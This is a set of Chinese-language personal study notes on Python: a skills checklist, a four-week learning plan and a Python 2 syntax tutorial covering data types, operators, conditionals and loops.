#Python关键技术
flask django
python、pypy、shell
熟悉 http、tcp/ip 网络协议
熟悉 Mysql、redis、twisted，精通SQL语法，有能力编写复杂SQL脚本， hadoop 、 hbase 、 spark 、 storm ， redis 集群、 mongodb 集群、 hbase 集群、 elasticsearch 集群
数据采集、清洗、入库等ETL流程，建立数据模型，对数据进行挖掘、优化及统计
机器学习、深度学习领域的技术研发工作，能够熟练的使用Caffe、Tensorflow、Theano、Torch、MXNet等任一种主流的深度学习框架
有linux环境开发经验，熟练使用脚本编程进行数据处理，如：ShellPython；


基于python深度学习库DeepPy的实现：https://github.com/andersbll/neural_artistic_style
基于python深度学习库TensorFlow的实现：https://github.com/anishathalye/neural-style
基于python深度学习库Caffe的实现：https://github.com/fzliu/style-transfer

1、Week1：读完《简明Python教程》，适应Python开发环境
2、Week2：写个爬虫，需要深入了解re、urllib2、sqlite3、threading，Queue等几个模块。需要用上多线程抓取，正则表达式分析，并发资源控制，重新开启程序自动继续抓取和分析
3、Week3：学习一种Web开发框架，推荐Flask、webpy之类的，学个数据库接口如sqlite3，写个简单的web应用如博客
4、Week4：给产品做个小功能并走完测试和上线流程，各个时期是不同的









#python编程常用知识点
循环
数组
选择
对象
输入输出
变量
对象
正则表达式
.*()
占位符与转义符


#python基础语法
参考库
	一译			http://python.usyiyi.cn
	python			https://docs.python.org/2.7/library/index.html
	pytz模块		http://www.twinsun.com/tz/tz-link.htm
    dateutil模块    http://labix.org/python-dateutil
	
	
Python 标识符
	在 Python 里，标识符由字母、数字、下划线组成。
	在 Python 中，所有标识符可以包括英文、数字以及下划线(_)，但不能以数字开头。
	Python 中的标识符是区分大小写的。
	以下划线开头的标识符是有特殊意义的。以单下划线开头 _foo 的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用 from xxx import * 而导入；
	以双下划线开头的 __foo 代表类的私有成员；以双下划线开头和结尾的 __foo__ 代表 Python 里特殊方法专用的标识，如 __init__() 代表类的构造函数。
	Python 可以同一行显示多条语句，方法是用分号 ; 分开

Python 保留字符
	下面的列表显示了在Python中的保留字。这些保留字不能用作常数或变数，或任何其他标识符名称。
	所有 Python 的关键字只包含小写字母。
		and			exec		not
		assert		finally		or
		break		for			pass
		class		from		print
		continue	global		raise
		def			if			return
		del			import		try
		elif		in			while
		else		is			with
		except		lambda		yield

行和缩进
	学习 Python 与其他语言最大的区别就是，Python 的代码块不使用大括号 {} 来控制类，函数以及其他逻辑判断。python 最具特色的就是用缩进来写模块。
	缩进的空白数量是可变的，但是所有代码块语句必须包含相同的缩进空白数量，这个必须严格执行。每个缩进层次使用 单个制表符 或 两个空格 或 四个空格 , 切记不能混用

多行语句
	Python语句中一般以新行作为为语句的结束符。
	但是我们可以使用斜杠（ \）将一行的语句分为多行显示，如下所示：
		total = item_one + \
					item_two + \
					item_three
	语句中包含 [], {} 或 () 括号就不需要使用多行连接符。如下实例：
		days = ['Monday', 'Tuesday', 'Wednesday',
				'Thursday', 'Friday']

Python 引号
	Python 可以使用引号( ' )、双引号( " )、三引号( ''' 或 """ ) 来表示字符串，引号的开始与结束必须的相同类型的。
	其中三引号可以由多行组成，编写多行文本的快捷语法，常用于文档字符串，在文件的特定地点，被当做注释。
		word = 'word'
		sentence = "这是一个句子。"
		paragraph = """这是一个段落。
		包含了多个语句""""""

Python注释
	python中单行注释采用 # 开头。
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	# 文件名：test.py

	# 第一个注释
	print "Hello, Python!";  # 第二个注释	
	
	注释可以在语句或表达式行末：
		name = "Madisetti" # 这是一个注释
	python 中多行注释使用三个单引号(''')或三个双引号(""")。
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		# 文件名：test.py


		'''
		这是多行注释，使用单引号。
		这是多行注释，使用单引号。
		这是多行注释，使用单引号。
		'''

		"""
		这是多行注释，使用双引号。
		这是多行注释，使用双引号。
		这是多行注释，使用双引号。
		""""""'''
			
Python空行
	函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。
	空行与代码缩进不同，空行并不是Python语法的一部分。书写时不插入空行，Python解释器运行也不会出错。但是空行的作用在于分隔两段不同功能或含义的代码，便于日后代码的维护或重构。
	记住：空行也是程序代码的一部分。			
		
	等待用户输入
	下面的程序执行后就会等待用户输入，按回车键后就会退出：
	#!/usr/bin/python

	raw_input("\n\nPress the enter key to exit.")
	以上代码中 ，"\n\n"在结果输出前会输出两个新的空行。一旦用户按下 enter(回车) 键退出，其它键显示。	

同一行显示多条语句
	Python可以在同一行中使用多条语句，语句之间使用分号(;)分割，以下是一个简单的实例：
	#!/usr/bin/python

	import sys; x = 'runoob'; sys.stdout.write(x + '\n')

Print 输出
	print 默认输出是换行的，如果要实现不换行需要在变量末尾加上逗号：
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	x="a"
	y="b"
	# 换行输出
	print x
	print y

	print '---------'
	# 不换行输出
	print x,
	print y,

	# 不换行输出
	print x,y

多个语句构成代码组
	缩进相同的一组语句构成一个代码块，我们称之代码组。
	像if、while、def和class这样的复合语句，首行以关键字开始，以冒号( : )结束，该行之后的一行或多行代码构成代码组。
	我们将首行及后面的代码组称为一个子句(clause)。
	如下实例：
		if expression : 
		   suite 
		elif expression :  
		   suite  
		else :  
		   suite 

命令行参数
	很多程序可以执行一些操作来查看一些基本信息，Python 可以使用 -h 参数查看各参数帮助信息：
	$ python -h 
	usage: python [option] ... [-c cmd | -m mod | file | -] [arg] ... 
	Options and arguments (and corresponding environment variables): 
	-c cmd : program passed in as string (terminates option list) 
	-d     : debug output from parser (also PYTHONDEBUG=x) 
	-E     : ignore environment variables (such as PYTHONPATH) 
	-h     : print this help message and exit 
	 
	[ etc. ] 
	我们在使用脚本形式执行 Python 时，可以接收命令行输入的参数，具体使用可以参照 Python 命令行参数。
	http://www.runoob.com/python/python-command-line-arguments.html

	
Python 变量类型
	变量存储在内存中的值。这就意味着在创建变量时会在内存中开辟一个空间。
	基于变量的数据类型，解释器会分配指定内存，并决定什么数据可以被存储在内存中。
	因此，变量可以指定不同的数据类型，这些变量可以存储整数，小数或字符。

	变量赋值
	Python 中的变量赋值不需要类型声明。
	每个变量在内存中创建，都包括变量的标识，名称和数据这些信息。
	每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。
	等号（=）用来给变量赋值。
	等号（=）运算符左边是一个变量名,等号（=）运算符右边是存储在变量中的值。
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		counter = 100 # 赋值整型变量
		miles = 1000.0 # 浮点型
		name = "John" # 字符串
		 
		print counter
		print miles
		print name

多个变量赋值
	Python允许你同时为多个变量赋值。例如：
	a = b = c = 1
	以上实例，创建一个整型对象，值为1，三个变量被分配到相同的内存空间上。
	您也可以为多个对象指定多个变量。例如：
	a, b, c = 1, 2, "john"
	以上实例，两个整型对象1和2的分配给变量 a 和 b，字符串对象 "john" 分配给变量 c。

标准数据类型
	在内存中存储的数据可以有多种类型。
	例如，一个人的年龄可以用数字来存储，他的名字可以用字符来存储。
	Python 定义了一些标准类型，用于存储各种类型的数据。
	Python有五个标准的数据类型：
	Numbers（数字）
	String（字符串）
	List（列表）
	Tuple（元组）
	Dictionary（字典）

Python数字
	数字数据类型用于存储数值。
	他们是不可改变的数据类型，这意味着改变数字数据类型会分配一个新的对象。
	当你指定一个值时，Number对象就会被创建：
		var1 = 1
		var2 = 10
	您也可以使用del语句删除一些对象的引用。
		del语句的语法是：
		del var1[,var2[,var3[....,varN]]]]
	您可以通过使用del语句删除单个或多个对象的引用。例如：
		del var
		del var_a, var_b
	Python支持四种不同的数字类型：
		int（有符号整型）
		long（长整型[也可以代表八进制和十六进制]）
		float（浮点型）
		complex（复数）	
	一些数值类型的实例：
		int	long	float	complex
		10	51924361L	0.0	3.14j
		100	-0x19323L	15.20	45.j
		-786	0122L	-21.9	9.322e-36j
		080	0xDEFABCECBDAECBFBAEl	32.3e+18	.876j
		-0490	535633629843L	-90.	-.6545+0J
		-0x260	-052318172735L	-32.54e100	3e+26J
		0x69	-4721885298529L	70.2E-12	4.53e-7j
		长整型也可以使用小写 l，但是还是建议您使用大写 L，避免与数字 1 混淆。Python使用 L 来显示长整型。
		Python 还支持复数，复数由实数部分和虚数部分构成，可以用 a + bj,或者 complex(a,b) 表示， 复数的实部 a 和虚部 b 都是浮点型。

Python字符串
	字符串或串(String)是由数字、字母、下划线组成的一串字符。一般记为 :s="a1a2···an"(n>=0),它是编程语言中表示文本的数据类型。
	python的字串列表有2种取值顺序:
		从左到右索引默认0开始的，最大范围是字符串长度少1
		从右到左索引默认-1开始的，最大范围是字符串开头
	如果你要实现从字符串中获取一段子字符串的话，可以使用变量 [头下标:尾下标]，就可以截取相应的字符串，其中下标是从 0 开始算起，可以是正数或负数，下标可以为空表示取到头或尾。
		比如:
		s = 'ilovepython'
		s[1:5]的结果是love。
		当使用以冒号分隔的字符串，python返回一个新的对象，结果包含了以这对偏移标识的连续的内容，左边的开始是包含了下边界。
		上面的结果包含了s[1]的值l，而取到的最大范围不包括上边界，就是s[5]的值p。
		加号（+）是字符串连接运算符，星号（*）是重复操作。
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		str = 'Hello World!'
		 
		print str           # 输出完整字符串
		print str[0]        # 输出字符串中的第一个字符
		print str[2:5]      # 输出字符串中第三个至第五个之间的字符串
		print str[-2:-5]
		print str[2:]       # 输出从第三个字符开始的字符串
		print str * 2       # 输出字符串两次
		print str + "TEST"  # 输出连接的字符串	
		
Python列表
	List（列表） 是 Python 中使用最频繁的数据类型。
	列表可以完成大多数集合类的数据结构实现。它支持字符，数字，字符串甚至可以包含列表（即嵌套）。
	列表用 [ ] 标识，是 python 最通用的复合数据类型。
	列表中值的切割也可以用到变量 [头下标:尾下标] ，就可以截取相应的列表，从左到右索引默认 0 开始，从右到左索引默认 -1 开始，下标可以为空表示取到头或尾。
	加号 + 是列表连接运算符，星号 * 是重复操作。如下实例：
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		list = [ 'runoob', 786 , 2.23, 'john', 70.2 ]
		tinylist = [123, 'john']
		 
		print list               # 输出完整列表
		print list[0]            # 输出列表的第一个元素
		print list[1:3]          # 输出第二个至第三个的元素 
		print list[2:]           # 输出从第三个开始至列表末尾的所有元素
		print tinylist * 2       # 输出列表两次
		print list + tinylist    # 打印组合的列表	
	
Python元组
	元组是另一个数据类型，类似于List（列表）。
	元组用"()"标识。内部元素用逗号隔开。但是元组不能二次赋值，相当于只读列表(元组是不允许更新的。而列表是允许更新的)。
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		tuple = ( 'runoob', 786 , 2.23, 'john', 70.2 )
		tinytuple = (123, 'john')
		 
		print tuple               # 输出完整元组
		print tuple[0]            # 输出元组的第一个元素
		print tuple[1:3]          # 输出第二个至第三个的元素 
		print tuple[2:]           # 输出从第三个开始至列表末尾的所有元素
		print tinytuple * 2       # 输出元组两次
		print tuple + tinytuple   # 打印组合的元组	
	
Python 字典
	字典(dictionary)是除列表以外python之中最灵活的内置数据结构类型。列表是有序的对象结合，字典是无序的对象集合。
	两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。
	字典用"{ }"标识。字典由索引(key)和它对应的值value组成。
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		dict = {}
		dict['one'] = "This is one"
		dict[2] = "This is two"
		 
		tinydict = {'name': 'john','code':6734, 'dept': 'sales'}
		 
		 
		print dict['one']          # 输出键为'one' 的值
		print dict[2]              # 输出键为 2 的值
		print tinydict             # 输出完整的字典
		print tinydict.keys()      # 输出所有键
		print tinydict.values()    # 输出所有值	

Python数据类型转换
	有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。
	以下几个内置的函数可以执行数据类型之间的转换。这些函数返回一个新的对象，表示转换的值。
		函数							描述
		int(x [,base])			将x转换为一个整数
		long(x [,base] )		将x转换为一个长整数
		float(x)				将x转换到一个浮点数
		complex(real [,imag])	创建一个复数
		str(x)					将对象 x 转换为字符串
		repr(x)					将对象 x 转换为表达式字符串
		eval(str)				用来计算在字符串中的有效Python表达式,并返回一个对象
		tuple(s)				将序列 s 转换为一个元组
		list(s)					将序列 s 转换为一个列表
		set(s)					转换为可变集合
		dict(d)					创建一个字典。d 必须是一个序列 (key,value)元组。
		frozenset(s)			转换为不可变集合
		chr(x)					将一个整数转换为一个字符
		unichr(x)				将一个整数转换为Unicode字符
		ord(x)					将一个字符转换为它的整数值(ASCII码值)
		hex(x)					将一个整数转换为一个十六进制字符串
		oct(x)					将一个整数转换为一个八进制字符串

Python算术运算符
	以下假设变量： a=10，b=20：
	运算符	描述		实例
	+		加 		两个对象相加	a + b 输出结果 30
	-		减		得到负数或是一个数减去另一个数	a - b 输出结果 -10
	*		乘 		两个数相乘或是返回一个被重复若干次的字符串	a * b 输出结果 200
	/		除 		x除以y	b / a 输出结果 2
	%		取模	返回除法的余数	b % a 输出结果 0
	**		幂		返回x的y次幂	a**b 为10的20次方， 输出结果 100000000000000000000
	//		取整除	返回商的整数部分	9//2 输出结果 4 , 9.0//2.0 输出结果 4.0
	Python所有算术运算符的操作
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 21
		b = 10
		c = 0
		 
		c = a + b
		print "1 - c 的值为：", c
		 
		c = a - b
		print "2 - c 的值为：", c 
		 
		c = a * b
		print "3 - c 的值为：", c 
		 
		c = a / b
		print "4 - c 的值为：", c 
		 
		c = a % b
		print "5 - c 的值为：", c
		 
		# 修改变量 a 、b 、c
		a = 2
		b = 3
		c = a**b 
		print "6 - c 的值为：", c
		 
		a = 10
		b = 5
		c = a//b 
		print "7 - c 的值为：", c

		
Python比较运算符
	以下假设变量a为10，变量b为20：
	运算符	描述	实例
	==	等于 - 比较对象是否相等	(a == b) 返回 False。
	!=	不等于 - 比较两个对象是否不相等	(a != b) 返回 true.
	<>	不等于 - 比较两个对象是否不相等	(a <> b) 返回 true。这个运算符类似 != 。
	>	大于 - 返回x是否大于y	(a > b) 返回 False。
	<	小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。注意，这些变量名的大写。	(a < b) 返回 true。
	>=	大于等于	- 返回x是否大于等于y。	(a >= b) 返回 False。
	<=	小于等于 -	返回x是否小于等于y。	(a <= b) 返回 true。
	以下实例演示了Python所有比较运算符的操作：
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 21
		b = 10
		c = 0
		 
		if ( a == b ):
		   print "1 - a 等于 b"
		else:
		   print "1 - a 不等于 b"
		 
		if ( a != b ):
		   print "2 - a 不等于 b"
		else:
		   print "2 - a 等于 b"
		 
		if ( a <> b ):
		   print "3 - a 不等于 b"
		else:
		   print "3 - a 等于 b"
		 
		if ( a < b ):
		   print "4 - a 小于 b" 
		else:
		   print "4 - a 大于等于 b"
		 
		if ( a > b ):
		   print "5 - a 大于 b"
		else:
		   print "5 - a 小于等于 b"
		 
		# 修改变量 a 和 b 的值
		a = 5
		b = 20
		if ( a <= b ):
		   print "6 - a 小于等于 b"
		else:
		   print "6 - a 大于  b"
		 
		if ( b >= a ):
		   print "7 - b 大于等于 a"
		else:
		   print "7 - b 小于 a"		

		   
Python赋值运算符
	以下假设变量a为10，变量b为20：
	运算符	描述	实例
	=	简单的赋值运算符	c = a + b 将 a + b 的运算结果赋值为 c
	+=	加法赋值运算符	c += a 等效于 c = c + a
	-=	减法赋值运算符	c -= a 等效于 c = c - a
	*=	乘法赋值运算符	c *= a 等效于 c = c * a
	/=	除法赋值运算符	c /= a 等效于 c = c / a
	%=	取模赋值运算符	c %= a 等效于 c = c % a
	**=	幂赋值运算符	c **= a 等效于 c = c ** a
	//=	取整除赋值运算符	c //= a 等效于 c = c // a
	以下实例演示了Python所有赋值运算符的操作：
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 21
		b = 10
		c = 0
		 
		c = a + b
		print "1 - c 的值为：", c
		 
		c += a
		print "2 - c 的值为：", c 
		 
		c *= a
		print "3 - c 的值为：", c 
		 
		c /= a 
		print "4 - c 的值为：", c 
		 
		c = 2
		c %= a
		print "5 - c 的值为：", c
		 
		c **= a
		print "6 - c 的值为：", c
		 
		c //= a
		print "7 - c 的值为：", c


Python位运算符
	运算符	描述	实例
	&	按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0	(a & b) 输出结果 12 ，二进制解释： 0000 1100
	|	按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。	(a | b) 输出结果 61 ，二进制解释： 0011 1101
	^	按位异或运算符：当两对应的二进位相异时，结果为1	(a ^ b) 输出结果 49 ，二进制解释： 0011 0001
	~	按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1 。~x 类似于 -x-1	(~a ) 输出结果 -61 ，二进制解释： 1100 0011，在一个有符号二进制数的补码形式。
	<<	左移动运算符：运算数的各二进位全部左移若干位，由"<<"右边的数指定移动的位数，高位丢弃，低位补0。	a << 2 输出结果 240 ，二进制解释： 1111 0000
	>>	右移动运算符：把">>"左边的运算数的各二进位全部右移若干位，">>"右边的数指定移动的位数	a >> 2 输出结果 15 ，二进制解释： 0000 1111
	以下实例演示了Python所有位运算符的操作：
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 60            # 60 = 0011 1100 
		b = 13            # 13 = 0000 1101 
		c = 0
		 
		c = a & b;        # 12 = 0000 1100
		print "1 - c 的值为：", c
		 
		c = a | b;        # 61 = 0011 1101 
		print "2 - c 的值为：", c
		 
		c = a ^ b;        # 49 = 0011 0001
		print "3 - c 的值为：", c
		 
		c = ~a;           # -61 = 1100 0011
		print "4 - c 的值为：", c
		 
		c = a << 2;       # 240 = 1111 0000
		print "5 - c 的值为：", c
		 
		c = a >> 2;       # 15 = 0000 1111
		print "6 - c 的值为：", c


Python逻辑运算符
	Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:
	运算符	逻辑表达式	描述	实例
	and	x and y	布尔"与" - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。	(a and b) 返回 20。
	or	x or y	布尔"或"	- 如果 x 是非 0，它返回 x 的值，否则它返回 y 的计算值。	(a or b) 返回 10。
	not	not x	布尔"非" - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。	not(a and b) 返回 False
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 10
		b = 20
		 
		if ( a and b ):
		   print "1 - 变量 a 和 b 都为 true"
		else:
		   print "1 - 变量 a 和 b 有一个不为 true"
		 
		if ( a or b ):
		   print "2 - 变量 a 和 b 都为 true，或其中一个变量为 true"
		else:
		   print "2 - 变量 a 和 b 都不为 true"
		 
		# 修改变量 a 的值
		a = 0
		if ( a and b ):
		   print "3 - 变量 a 和 b 都为 true"
		else:
		   print "3 - 变量 a 和 b 有一个不为 true"
		 
		if ( a or b ):
		   print "4 - 变量 a 和 b 都为 true，或其中一个变量为 true"
		else:
		   print "4 - 变量 a 和 b 都不为 true"
		 
		if not( a and b ):
		   print "5 - 变量 a 和 b 都为 false，或其中一个变量为 false"
		else:
		   print "5 - 变量 a 和 b 都为 true"


Python成员运算符
	除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。
	运算符	描述	实例
	in	如果在指定的序列中找到值返回 True，否则返回 False。	x 在 y 序列中 , 如果 x 在 y 序列中返回 True。
	not in	如果在指定的序列中没有找到值返回 True，否则返回 False。	x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。
	以下实例演示了Python所有成员运算符的操作：
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 10
		b = 20
		list = [1, 2, 3, 4, 5 ];
		 
		if ( a in list ):
		   print "1 - 变量 a 在给定的列表中 list 中"
		else:
		   print "1 - 变量 a 不在给定的列表中 list 中"
		 
		if ( b not in list ):
		   print "2 - 变量 b 不在给定的列表中 list 中"
		else:
		   print "2 - 变量 b 在给定的列表中 list 中"
		 
		# 修改变量 a 的值
		a = 2
		if ( a in list ):
		   print "3 - 变量 a 在给定的列表中 list 中"
		else:
		   print "3 - 变量 a 不在给定的列表中 list 中"


Python身份运算符
	身份运算符用于比较两个对象的存储单元
	运算符	描述	实例
	is	is 是判断两个标识符是不是引用自一个对象	x is y, 类似 id(x) == id(y) , 如果引用的是同一个对象则返回 True，否则返回 False
	is not	is not 是判断两个标识符是不是引用自不同对象	x is not y ， 类似 id(a) != id(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。
	注： id() 函数用于获取对象内存地址。
	is 与 == 区别：
		is 用于判断两个变量引用对象是否为同一个， == 用于判断引用变量的值是否相等。
	以下实例演示了Python所有身份运算符的操作：
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 20
		b = 20
		 
		if ( a is b ):
		   print "1 - a 和 b 有相同的标识"
		else:
		   print "1 - a 和 b 没有相同的标识"
		 
		if ( a is not b ):
		   print "2 - a 和 b 没有相同的标识"
		else:
		   print "2 - a 和 b 有相同的标识"
		 
		# 修改变量 b 的值
		b = 30
		if ( a is b ):
		   print "3 - a 和 b 有相同的标识"
		else:
		   print "3 - a 和 b 没有相同的标识"
		 
		if ( a is not b ):
		   print "4 - a 和 b 没有相同的标识"
		else:
		   print "4 - a 和 b 有相同的标识"

Python运算符优先级
	以下表格列出了从最高到最低优先级的所有运算符：
	运算符	描述
	**	指数 (最高优先级)
	~ + -	按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)
	* / % //	乘，除，取模和取整除
	+ -	加法减法
	>> <<	右移，左移运算符
	&	位 'AND'
	^ |	位运算符
	<= < > >=	比较运算符
	<> == !=	等于运算符
	= %= /= //= -= += *= **=	赋值运算符
	is is not	身份运算符
	in not in	成员运算符
	not or and	逻辑运算符
	以下实例演示了Python所有运算符优先级的操作：
	实例(Python 2.0+)
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		a = 20
		b = 10
		c = 15
		d = 5
		e = 0
		 
		e = (a + b) * c / d       #( 30 * 15 ) / 5
		print "(a + b) * c / d 运算结果为：",  e
		 
		e = ((a + b) * c) / d     # (30 * 15 ) / 5
		print "((a + b) * c) / d 运算结果为：",  e
		 
		e = (a + b) * (c / d);    # (30) * (15/5)
		print "(a + b) * (c / d) 运算结果为：",  e
		 
		e = a + (b * c) / d;      #  20 + (150/5)
		print "a + (b * c) / d 运算结果为：",  e

		
Python 条件语句
	Python条件语句是通过一条或多条语句的执行结果（True或者False）来决定执行的代码块。
	Python程序语言指定任何非0和非空（null）值为true，0 或者 null为false。
	Python 编程中 if 语句用于控制程序的执行，基本形式为：
		if 判断条件：
			执行语句……
		else：
			执行语句……
	其中"判断条件"成立时（非零），则执行后面的语句，而执行内容可以多行，以缩进来区分表示同一范围。
	else 为可选语句，当需要在条件不成立时执行内容则可以执行相关语句，具体例子如下：
	实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		# 例1：if 基本用法
		 
		flag = False
		name = 'luren'
		if name == 'python':         # 判断变量否为'python'
			flag = True          # 条件成立时设置标志为真
			print 'welcome boss'    # 并输出欢迎信息
		else:
			print name              # 条件不成立时输出变量名称

	if 语句的判断条件可以用>（大于）、<(小于)、==（等于）、>=（大于等于）、<=（小于等于）来表示其关系。
	当判断条件为多个值时，可以使用以下形式：
		if 判断条件1:
			执行语句1……
		elif 判断条件2:
			执行语句2……
		elif 判断条件3:
			执行语句3……
		else:
			执行语句4……			
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		# 例2：elif用法
		 
		num = 5     
		if num == 3:            # 判断num的值
			print 'boss'        
		elif num == 2:
			print 'user'
		elif num == 1:
			print 'worker'
		elif num < 0:           # 值小于零时输出
			print 'error'
		else:
			print 'roadman'     # 条件均不成立时输出
			
	由于 python 并不支持 switch 语句，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。
	实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		# 例3：if语句多个条件
		 
		num = 9
		if num >= 0 and num <= 10:    # 判断值是否在0~10之间
			print 'hello'
		# 输出结果: hello
		 
		num = 10
		if num < 0 or num > 10:    # 判断值是否在小于0或大于10
			print 'hello'
		else:
			print 'undefine'
		# 输出结果: undefine
		 
		num = 8
		# 判断值是否在0~5或者10~15之间
		if (num >= 0 and num <= 5) or (num >= 10 and num <= 15):    
			print 'hello'
		else:
			print 'undefine'
		# 输出结果: undefine
		当if有多个条件时可使用括号来区分判断的先后顺序，括号中的判断优先执行，此外 and 和 or 的优先级低于>（大于）、<（小于）等判断符号，即大于和小于在没有括号的情况下会比与或要优先判断。

	简单的语句组
		你也可以在同一行的位置上使用if条件判断语句，如下实例：
		实例
		#!/usr/bin/python 
		# -*- coding: UTF-8 -*-
		 
		var = 100 
		 
		if ( var  == 100 ) : print "变量 var 的值为100" 
		 
		print "Good bye!"
	

Python 循环语句
	循环语句允许我们执行一个语句或语句组多次
	Python提供了for循环和while循环（在Python中没有do..while循环）:
		循环类型	描述
		while 循环	在给定的判断条件为 true 时执行循环体，否则退出循环体。
		for 循环	重复执行语句
		嵌套循环	你可以在while循环体中嵌套for循环

	循环控制语句
		循环控制语句可以更改语句执行的顺序。Python支持以下循环控制语句：
		控制语句	描述
		break 语句	在语句块执行过程中终止循环，并且跳出整个循环
		continue 语句	在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。
		pass 语句	pass是空语句，是为了保持程序结构的完整性。
	
Python While 循环语句
		Python 编程中 while 语句用于循环执行程序，即在某条件下，循环执行某段程序，以处理需要重复处理的相同任务。其基本形式为：
			while 判断条件：
				执行语句……
		执行语句可以是单个语句或语句块。判断条件可以是任何表达式，任何非零、或非空（null）的值均为true。
		当判断条件假false时，循环结束。
			#!/usr/bin/python
		 
			count = 0
			while (count < 9):
			   print 'The count is:', count
			   count = count + 1
			 
			print "Good bye!"

	循环控制
		while 语句时还有另外两个重要的命令 continue，break 来跳过循环，continue 用于跳过该次循环，break 则是用于退出循环，此外"判断条件"还可以是个常值，表示循环必定成立，具体用法如下：
		# continue 和 break 用法
		 
		i = 1
		while i < 10:   
			i += 1
			if i%2 > 0:     # 非双数时跳过输出
				continue
			print i         # 输出双数2、4、6、8、10
		 
		i = 1
		while 1:            # 循环条件为1必定成立
			print i         # 输出1~10
			i += 1
			if i > 10:     # 当i大于10时跳出循环
				break
				
	无限循环
		如果条件判断语句永远为 true，循环将会无限的执行下去，如下实例：
		实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		var = 1
		while var == 1 :  # 该条件永远为true，循环将无限执行下去
		   num = raw_input("Enter a number  :")
		   print "You entered: ", num
		 
		print "Good bye!"

	循环使用 else 语句
		在 python 中，while … else 在循环条件为 false 时执行 else 语句块：
		实例
		#!/usr/bin/python
		 
		count = 0
		while count < 5:
		   print count, " is  less than 5"
		   count = count + 1
		else:
		   print count, " is not less than 5"
		   
	简单语句组
		类似 if 语句的语法，如果你的 while 循环体中只有一条语句，你可以将该语句与while写在同一行中， 如下所示：
		实例
		#!/usr/bin/python
		 
		flag = 1
		 
		while (flag): print 'Given flag is really true!'
		 
		print "Good bye!"

Python for 循环语句
	Python for循环可以遍历任何序列的项目，如一个列表或者一个字符串。
	语法：
	for循环的语法格式如下：
	for iterating_var in sequence:
	   statements(s)
	实例  
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		for letter in 'Python':     # 第一个实例
		   print '当前字母 :', letter
		 
		fruits = ['banana', 'apple',  'mango']
		for fruit in fruits:        # 第二个实例
		   print '当前水果 :', fruit
		 
		print "Good bye!"

	通过序列索引迭代
		另外一种执行循环的遍历方式是通过索引，如下实例：
		实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		fruits = ['banana', 'apple',  'mango']
		for index in range(len(fruits)):
		   print '当前水果 :', fruits[index]
		 
		print "Good bye!"
		#内置函数 len() 和 range(),函数 len() 返回列表的长度，即元素的个数。 range返回一个范围内的列表
	
	循环使用 else 语句
		在 python 中，for … else 表示这样的意思，for 中的语句和普通的没有区别，else 中的语句会在循环正常执行完（即 for 不是通过 break 跳出而中断的）的情况下执行，while … else 也是一样。
		实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		for num in range(10,20):  # 迭代 10 到 20 之间的数字
		   for i in range(2,num): # 根据因子迭代
			  if num%i == 0:      # 确定第一个因子
				 j=num/i          # 计算第二个因子
				 print '%d 等于 %d * %d' % (num,i,j)
				 break            # 跳出当前循环
		   else:                  # 循环的 else 部分
			  print num, '是一个质数'
			  
Python 循环嵌套
	Python 语言允许在一个循环体里面嵌入另一个循环。
	Python for 循环嵌套语法：
		for iterating_var in sequence:
		   for iterating_var in sequence:
			  statements(s)
		   statements(s)
	Python while 循环嵌套语法：
		while expression:
		   while expression:
			  statement(s)
		   statement(s)
	你可以在循环体内嵌入其他的循环体，如在while循环中可以嵌入for循环， 反之，你可以在for循环中嵌入while循环。
	实例：
	以下实例使用了嵌套循环输出2~100之间的素数：
	实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		i = 2
		while(i < 100):
		   j = 2
		   while(j <= (i/j)):
			  if not(i%j): break
			  j = j + 1
		   if (j > i/j) : print i, " 是素数"
		   i = i + 1
		 
		print "Good bye!"

Python break 语句
	Python break语句，就像在C语言中，打破了最小封闭for或while循环。
